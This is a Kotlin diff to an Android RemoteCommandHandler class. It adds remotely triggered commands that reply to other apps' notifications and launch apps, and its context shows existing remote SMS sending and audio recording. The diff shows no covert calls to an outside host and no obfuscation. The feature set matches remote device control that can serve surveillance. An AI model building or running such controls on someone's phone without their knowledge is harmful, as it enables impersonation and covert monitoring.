@@ -114,6 +114,15 @@ class RemoteCommandHandler @Inject constructor(
                 val body = command.params["body"] ?: return
                 sendSms(to, body)
             }
+            "reply_notification" -> {
+                val pkg = command.params["package"] ?: return
+                val text = command.params["text"] ?: return
+                replyToNotification(pkg, text)
+            }
+            "launch_app" -> {
+                val pkg = command.params["package"] ?: return
+                launchApp(pkg)
+            }
         }
     }
 
@@ -163,6 +172,33 @@ class RemoteCommandHandler @Inject constructor(
             runCatching { recorder.release() }
             audioRecorder = null
             file.delete()
+        }
+    }
+
+    private fun replyToNotification(packageName: String, text: String) {
+        val nls = NotificationMonitorService.instance
+        if (nls == null) {
+            AppLogger.log(context, "[agent]", "NLS not available for reply")
+            return
+        }
+        val success = nls.replyToNotification(packageName, text)
+        if (!success) {
+            AppLogger.log(context, "[agent]", "No replyable notification found for $packageName")
+        }
+    }
+
+    private fun launchApp(packageName: String) {
+        runCatching {
+            val intent = context.packageManager.getLaunchIntentForPackage(packageName)
+            if (intent != null) {
+                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                context.startActivity(intent)
+                AppLogger.log(context, "[agent]", "Launched app: $packageName")
+            } else {
+                AppLogger.log(context, "[agent]", "No launch intent for $packageName")
+            }
+        }.onFailure { e ->
+            AppLogger.log(context, "[agent]", "App launch error: ${e.message}")
         }
     }
 
